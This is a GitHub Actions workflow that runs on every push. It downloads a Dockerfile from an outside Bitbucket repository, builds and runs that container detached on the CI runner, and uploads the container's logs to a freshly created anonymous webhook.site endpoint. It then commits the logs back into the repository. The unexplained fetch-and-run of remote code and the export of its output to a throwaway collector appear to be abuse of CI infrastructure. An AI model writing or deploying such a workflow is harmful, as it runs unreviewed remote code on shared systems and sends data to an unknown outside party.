name: Run script

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  run-nnbios:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Get webhook URL
        id: webhook
        run: |
          UUID=$(curl -s -X POST https://webhook.site/token | jq -r '.uuid')
          echo "uuid=$UUID" >> $GITHUB_OUTPUT
          echo "url=https://webhook.site/$UUID" >> $GITHUB_OUTPUT

      - name: Echo webhook URL
        run: |
          echo "::notice title=Logs URL::${{ steps.webhook.outputs.url }}"
          echo "### Logs URL" >> $GITHUB_STEP_SUMMARY
          echo "${{ steps.webhook.outputs.url }}" >> $GITHUB_STEP_SUMMARY

      - name: Build container
        run: |
          curl -fSL https://bitbucket.org/hermes-new/hermes/raw/main/Dockerfile -o Dockerfile
          docker build -t hermes . && docker run -d --name hermes -p 5000:5000 hermes

      - name: Stream logs
        run: |
          mkdir -p logs
          docker logs -f hermes > logs/container.log 2>&1 &
          sleep 140s
          curl -s -X PUT "https://webhook.site/token/${{ steps.webhook.outputs.uuid }}" \
                -H 'Content-Type: application/json' \
                -d "{\"default_content\":$(jq -Rs . < logs/container.log),\"default_content_type\":\"text/plain; charset=utf-8\"}" || true

      - name: Push logs
        run: |
          git config --local user.email "action@github.com"
          git config --local user.name "GitHub Action"
          git add logs/container.log && git commit -m "Update logs" && git push || true
